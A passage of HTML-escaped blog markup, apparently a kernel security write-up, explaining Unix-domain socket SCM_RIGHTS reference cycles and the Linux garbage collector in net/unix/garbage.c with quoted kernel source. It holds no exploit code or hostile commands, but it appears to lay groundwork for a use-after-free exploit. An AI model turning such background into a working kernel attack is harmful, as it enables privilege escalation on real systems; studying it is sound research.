class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;&amp;nbsp;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c44\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c44\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;&amp;nbsp;sends socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c44\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to socket &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Close &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnuMdkCyfn1Xhzr4NJiNcf3Oxt8ZB8kCVOZEIIVcuTGoHGEq37NFy44gE-wgNaaIZiwoSE0iWSpfifiXtfEMc0qec9_Lih7VE3xqzQJ6PjIGMT7K6Jcz0VLfYELIev025FXRJbnmnKHdChHBnk7DnjFQSRe0kB8k9zoXBP_ZYh7SYlCkQ08qHYhyxY/s1999/image68.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnuMdkCyfn1Xhzr4NJiNcf3Oxt8ZB8kCVOZEIIVcuTGoHGEq37NFy44gE-wgNaaIZiwoSE0iWSpfifiXtfEMc0qec9_Lih7VE3xqzQJ6PjIGMT7K6Jcz0VLfYELIev025FXRJbnmnKHdChHBnk7DnjFQSRe0kB8k9zoXBP_ZYh7SYlCkQ08qHYhyxY/s1200/image68.png\" border=\"0\" alt=\"A, B and alpha form a breakable cycle.\" style=\"max-height: 750px; max-width: 600px;\"title=\"A, B and alpha form a breakable cycle.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;Breakable cycle for &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c32\"&gt;and&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The cycle is breakable, because &lt;/span&gt;&lt;span&gt;we can get newly installed file descriptor &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;rsquo;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the socket file descriptor &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c44\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and newly installed file descriptor &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;A&amp;#39;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;B&lt;/span&gt;&lt;span&gt;&amp;rsquo;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.6bkr31v5bx7w\"&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;Garbage Collection&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;A h&lt;/span&gt;&lt;span&gt;igh level view of garbage collection is available from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://lwn.net/Articles/779472/\"&gt;lwn.net&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c38\"&gt;&amp;quot;&lt;/span&gt;&lt;span class=\"c34 c19 c49 c38\"&gt;If, instead, the two counts are equal, that file structure might be part of an unreachable cycle. To determine whether that is the case, the kernel finds the set of all in-flight Unix-domain sockets for which all references are contained in SCM_RIGHTS datagrams (for which f_count and inflight are equal, in other words). It then counts how many references to each of those sockets come from SCM_RIGHTS datagrams attached to sockets in this set. Any socket that has references coming from outside the set is reachable and can be removed from the set. If it is reachable, and if there are any SCM_RIGHTS datagrams waiting to be consumed attached to it, the files contained within that datagram are also reachable and can be removed from the set.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"c34 c19 c38 c49\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"c34 c19 c49 c38\"&gt;At the end of an iterative process, the kernel may find itself with a set of in-flight Unix-domain sockets that are only referenced by unconsumed (and unconsumable) SCM_RIGHTS datagrams; at this point, it has a cycle of file structures holding the only references to each other. Removing those datagrams from the queue, releasing the references they hold, and discarding them will break the cycle.&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;To be more specific, the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;garbage collection system was developed in order to handle the unbreakable reference cycles. To identify which file descriptors are a part of unbreakable cycles:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c27 lst-kix_iptxq54yrrnf-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Add any &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_sock&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects whose reference count equals its inflight count to the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;list.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Determine if the socket is referenced by any sockets outside of the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;list. If it is then it is reachable, remove it and any sockets it references from the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;list. &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Repeat until no more reachable sockets are found.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;After this iterative process, only sockets who are solely referenced by other sockets within the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;list are left. &lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Let&amp;rsquo;s take a closer look at how this garbage collection process works. First, the kernel finds all the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_sock&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects whose reference counts equals their inflight count and puts them into the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;list&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L242\"&gt;garbage.c#L242)&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.abfa5bba6c1c21ddf7addd07cef8c63ba518ddc9\"&gt;&lt;/a&gt;&lt;a id=\"t.8\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_for_each_entry_safe&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;next&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;gc_inflight_list&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;long&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;total_refs&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;long&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;inflight_refs&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; total_refs &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;file_count&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;.&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk_socket&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;file&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; inflight_refs &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;atomic_long_read&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c29\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;inflight_refs &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c35\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;total_refs &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;inflight_refs&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14 ykcrMYlEiJ-c7\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;total_refs &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;==&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;inflight_refs&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; list_move_tail&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __set_bit&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIX_GC_CANDIDATE&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;gc_flags&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __set_bit&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;UNIX_GC_MAYBE_CYCLE&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;gc_flags&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10 ykcrMYlEiJ-c7\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Next, the kernel removes any sockets that are referenced by other sockets outside of the current &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;list. To do this, the kernel invokes &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scan_children&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L138\"&gt;garbage.c#138&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) along with the function pointer &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;dec_inflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;to iterate through each candidate&amp;rsquo;s &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;sk-&amp;gt;receive_queue&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It decreases the inflight count for each of the passed file descriptors that are themselves candidates for garbage collection (&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L261\"&gt;garbage.c#L261&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.fc28a79164e4bd7a8bdd4781c31aead0becb7e3a\"&gt;&lt;/a&gt;&lt;a id=\"t.9\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;/* Now remove all internal in-flight reference to children of&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;* the candidates.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c23\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_for_each_entry&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;gc_candidates&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; scan_children&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;dec_inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;After iterating through all the candidates, if a gc 